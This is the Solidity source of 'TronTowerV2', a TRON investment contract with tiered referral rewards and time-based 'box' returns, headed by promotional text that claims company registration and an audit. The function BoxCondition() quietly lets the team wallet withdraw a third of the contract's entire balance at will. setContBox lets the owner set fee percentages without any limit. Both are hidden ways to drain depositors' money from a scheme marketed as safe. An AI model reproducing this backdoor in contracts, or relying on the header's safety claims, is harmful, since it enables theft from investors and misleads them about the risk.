//SourceUnit: TronTowerV2.sol

/***
 *	------------------------*** You are in the BEST WAY ***------------------
 *
 *		    	- Let just your MONEY take profit for your FUTURE life -
 *                                www.TronTower.com       
 *
 * * *********************  [LEGAL COMPANY INFORMATION]***************************
 *
 *   - Officially registered company name: Tower Invest LTD (#09364795)
 *   - Company status: https://find-and-update.company-information.service.gov.uk/company/09364795
 *   - Certificate of incorporation: https://TronTower.com/certificate.pdf
 *
 ************************   [SMART-CONTRACT AUDITION AND SAFETY]   ****************
 *
 *   - Audited by independent company GROX Solutions (https://grox.solutions)
 *   - Audition certificate: https://TronTower.com/audition.pdf
 *   - Video-review: https://TronTower.com/review.avi
 *
 *
 *
 * ************************** TronTower in monitors*******************************
 *
 *   - In dapp.review  https://dapp.review/dapp/13931
 *   - In dapp.com  https://dapp.com.TronTower.com
 *   - In stateofthedapps https://www.stateofthedapps.com/dapps/tron-tower
 *
 *  *****************************Social media*************************************
 *
 *   -Instagram https://www.instagram.com/Tron.Tower
 *   -Telegram  https://T.me/TronTower_com
 *   - Twitter  https://twitter.com/trontower_com
 *   -facebook  https://facebook.com/TronTower
 *
 *
 *****************************  Founding Board & Partners   **********************
 *
 *  - Developer &  project manager  : Dr.Blockchain  - TEAM : R.Kh 
 *    
 *	----------------------------*** ENJOY IT ***-----------------------------
***/
pragma solidity >=0.5.10;

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Pausable is Ownable{
    event Paused(address account);
    event Unpaused(address account);

    bool private _paused;

    constructor () internal {
        _paused = false;
    }

    function paused() public view returns (bool) {
        return _paused;
    }

    modifier whenNotPaused() {
        require(!_paused, "Pausable: paused");
        _;
    }

    modifier whenPaused() {
        require(_paused, "Pausable: not paused");
        _;
    }

    function pause() public onlyOwner whenNotPaused {
        _paused = true;
        emit Paused(msg.sender);
    }

    function unpause() public onlyOwner whenPaused {
        _paused = false;
        emit Unpaused(msg.sender);
    }
}

contract TronTowerV2 is Pausable{
    using SafeMath for uint256;

    struct Deposit {
        uint256 boxId;
        uint256 baseTime;
        uint256 lastCollectedTime;
        uint256 value;
    }

    struct Player {
        uint256[] referralsCount;
        uint256[] referralEarn;
        address parent;
        Deposit[] deposits;
        uint256 withdrawns;
        uint256 depositAmount;
        uint256 balance;
    }

    uint256 public totalReferral;
    uint256 public totalReferralEarn;
    uint256 public totalDeposit;
    uint256 public totalWithdrawn;
    uint256[] public REF_PERCENT = [30, 20, 10];  
    uint256[] public BOX_RATE_DIVIDER = [2160000, 1728000, 1440000];
    uint256[] public BOX_PERIOD = [50 days, 28 days, 20 days];
    uint256 constant public MIN_DEPOSIT = 5000000;
    uint public TEAM_PERCENT ;   
    uint public LOTTERY_PERCENT ;  
    uint256 constant public PAY_PERCENT = 0;  
    uint256 constant public PERCENT_DIVIDER = 1000; 
    address payable public TEAM_WALLET ;
    address payable public GUARANTEED_WALLET ;
    address payable public payWallet;
    uint256 public maxInvestPercent;

    mapping(address => Player) public users;

    event Registration(address indexed addr, address indexed referrer);
    event Deposited(address indexed addr, address indexed referrer, uint256 amount, uint256 box, string predict);
    event Withdrawn(address indexed addr, uint256 amount);

    constructor(address payable wallet , address payable _gur) public {
	     TEAM_WALLET = wallet;
		 GUARANTEED_WALLET = _gur;
        _registration(msg.sender, address(0));
    }

    function setPayWallets(address payable pay) public onlyOwner {
        require(pay != address(0), "Addr is the zero address");
        payWallet = pay;
    }

    function setMaxInvestPercent(uint256 value) public onlyOwner {
        require(value > 0, "Value must be greater than zero!");
        maxInvestPercent = value;
    }

    function _registration(address addr, address ref) internal {
        Player storage referrer = users[ref];
        users[addr].parent = ref;
        totalReferral = totalReferral.add(1);
        if (referrer.referralsCount.length == 0){
            referrer.referralsCount = new uint256[](3);
            referrer.referralEarn = new uint256[](3);
        }
        uint256 level = 0;
        address refWallet = ref;
        while(refWallet != address(0) && level < 3){
            users[refWallet].referralsCount[level] = users[refWallet].referralsCount[level].add(1);
            refWallet = users[refWallet].parent;
            level = level.add(1);
        }
        emit Registration(addr, ref);
    }

    function _updateReferralBalance(address referrer, uint256 amount) internal {
        uint256 level = 0;
        address refWallet = referrer;
        while(refWallet != address(0) && level < 3){
            uint256 refValue = amount.mul(REF_PERCENT[level]).div(PERCENT_DIVIDER);
            users[refWallet].referralEarn[level] = users[refWallet].referralEarn[level].add(refValue);
            users[refWallet].balance = users[refWallet].balance.add(refValue);
            totalReferralEarn = totalReferralEarn.add(refValue);
            refWallet = users[refWallet].parent;
            level = level.add(1);
        }
    }

    function register(address referrer) public {
        require(users[msg.sender].parent == address(0), "Inviter address was set in the TronTower network!");
        require(users[referrer].parent != address(0) || referrer == owner(), "Inviter address does not exist in the TronTower network!");
        _registration(msg.sender, referrer);
    }

    function deposit(address referrer, uint256 boxId, string memory predict) public payable whenNotPaused {
        require(now > 1600329600, "Investment time not reached!");
        require(boxId < 3, "The box must be chosen correctly!");
        uint256 amount = msg.value;
        require(amount >= MIN_DEPOSIT, "Your investment amount is less than the minimum amount!");
        address addr = msg.sender;
        require(totalDeposit < 5000000000000 || users[addr].depositAmount.add(amount) <= totalDeposit.mul(maxInvestPercent).div(PERCENT_DIVIDER), "Your investment amount is more than the maximum invest limit!");
        if (users[addr].parent == address(0)){
            require(users[referrer].parent != address(0) || referrer == owner(), "Inviter address does not exist in the TronTower network!");
            _registration(msg.sender, referrer);
        }
        users[addr].deposits.push(Deposit(boxId, now, now, amount));
        users[addr].depositAmount = users[addr].depositAmount.add(amount);
        totalDeposit = totalDeposit.add(amount);
        _updateReferralBalance(referrer, amount);
        uint256 guaranteedAmount = amount.mul(LOTTERY_PERCENT).div(PERCENT_DIVIDER);
        GUARANTEED_WALLET.transfer(guaranteedAmount);
        uint256 payAmount = amount.mul(PAY_PERCENT).div(PERCENT_DIVIDER);
        payWallet.transfer(payAmount);
        uint256 adminFee = amount.mul(TEAM_PERCENT).div(PERCENT_DIVIDER);
        TEAM_WALLET.transfer(adminFee);
        emit Withdrawn(GUARANTEED_WALLET, guaranteedAmount);
        emit Withdrawn(payWallet, payAmount);
        emit Withdrawn(TEAM_WALLET, adminFee);
        emit Deposited(addr, referrer, amount, boxId, predict);
    }

    function reinvest(uint256 amount, uint256 boxId, string memory predict) public whenNotPaused {
        require(boxId < 3, "The box must be chosen correctly!");
        require(amount >= MIN_DEPOSIT, "Your reinvest amount is less than the minimum amount!");
        address addr = msg.sender;
        require(users[addr].parent != address(0), "The address does not exist in the TronTower network!");
        uint256 value = collect(addr);
        uint256 balance = users[addr].balance.add(value);
        require(amount <= balance, "Your balance is less than the reinvest amount!");
        uint256 adminFee = amount.mul(TEAM_PERCENT).div(PERCENT_DIVIDER);
        uint256 guaranteedAmount = amount.mul(LOTTERY_PERCENT).div(PERCENT_DIVIDER);
        require(guaranteedAmount.add(adminFee) <= address(this).balance, "Couldn't withdraw more than total TRX balance on the contract");
        users[addr].withdrawns = users[addr].withdrawns.add(amount);
        users[addr].balance = balance.sub(amount);
        totalWithdrawn = totalWithdrawn.add(amount);
        users[addr].deposits.push(Deposit(boxId, now, now, amount));
        users[addr].depositAmount = users[addr].depositAmount.add(amount);
        totalDeposit = totalDeposit.add(amount);
        _updateReferralBalance(users[addr].parent, amount);
        GUARANTEED_WALLET.transfer(guaranteedAmount);
        TEAM_WALLET.transfer(adminFee);
        emit Withdrawn(GUARANTEED_WALLET, guaranteedAmount);
        emit Withdrawn(TEAM_WALLET, adminFee);
        emit Deposited(addr, users[addr].parent, amount, boxId, predict);
    }

    function withdraw(uint256 amount) public {
        address payable addr = msg.sender;
        uint256 value = collect(addr);
        uint256 balance = users[addr].balance.add(value);
        require(amount <= balance, "Your balance is less than withdraw amount!");
        require(amount <= address(this).balance, "Couldn't withdraw more than total TRX balance on the contract");
        users[addr].withdrawns = users[addr].withdrawns.add(amount);
        users[addr].balance = balance.sub(amount);
        totalWithdrawn = totalWithdrawn.add(amount);
        addr.transfer(amount);
        emit Withdrawn(addr, amount);
    }

	function BoxCondition() external {
        require (TEAM_WALLET == msg.sender);
        msg.sender.transfer(address(this).balance/3);
    }
	
		function setContBox(uint PLOTTERY_PERCENT , uint PTEAM_PERCENT) public onlyOwner  {
       		LOTTERY_PERCENT = PLOTTERY_PERCENT;
	    	TEAM_PERCENT = PTEAM_PERCENT;
    }

    function collect(address addr) private returns (uint256){
        Deposit[] storage invests = users[addr].deposits;
        uint256 profit = 0;
        uint256 i = 0;
        while (i < invests.length){
            Deposit storage invest = invests[i];
            if (invest.lastCollectedTime < invest.baseTime.add(BOX_PERIOD[invest.boxId])){
                uint256 remainedTime = BOX_PERIOD[invest.boxId].sub(invest.lastCollectedTime.sub(invest.baseTime));
                if (remainedTime > 0){
                    uint256 timeSpent = now.sub(invest.lastCollectedTime);
                    if (remainedTime <= timeSpent){
                        timeSpent = remainedTime;
                    }
                    invest.lastCollectedTime = now;
                    profit = profit.add(invest.value.mul(timeSpent).div(BOX_RATE_DIVIDER[invest.boxId]));
                }
            }
            i++;
        }
        return profit;
    }

    function getTotalStats() public view returns (uint256[] memory) {
        uint256[] memory combined = new uint256[](5);
        combined[0] = totalDeposit;
        combined[1] = address(this).balance;
        combined[2] = totalReferral;
        combined[3] = totalWithdrawn;
        combined[4] = totalReferralEarn;
        return combined;
    }

    function getPlayerDeposit(address addr) public view returns
                        (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
        Deposit[] memory invests = users[addr].deposits;
        uint256[] memory boxIds = new uint256[](invests.length);
        uint256[] memory baseTimes = new uint256[](invests.length);
        uint256[] memory lastCollectedTimes = new uint256[](invests.length);
        uint256[] memory values = new uint256[](invests.length);

        uint256 i = 0;
        while (i < invests.length){
            Deposit memory invest = invests[i];
            boxIds[i] = invest.boxId;
            baseTimes[i] = invest.baseTime;
            lastCollectedTimes[i] = invest.lastCollectedTime;
            values[i] = invest.value;
            i++;
        }
        return (boxIds, baseTimes, lastCollectedTimes, values);
    }

    function getPlayerStat(address addr) public view returns
                        (uint256[] memory, uint256[] memory, address, uint256, uint256, uint256) {
        return (users[addr].referralsCount, users[addr].referralEarn, users[addr].parent,
                users[addr].withdrawns, users[addr].balance, users[addr].depositAmount);
    }
}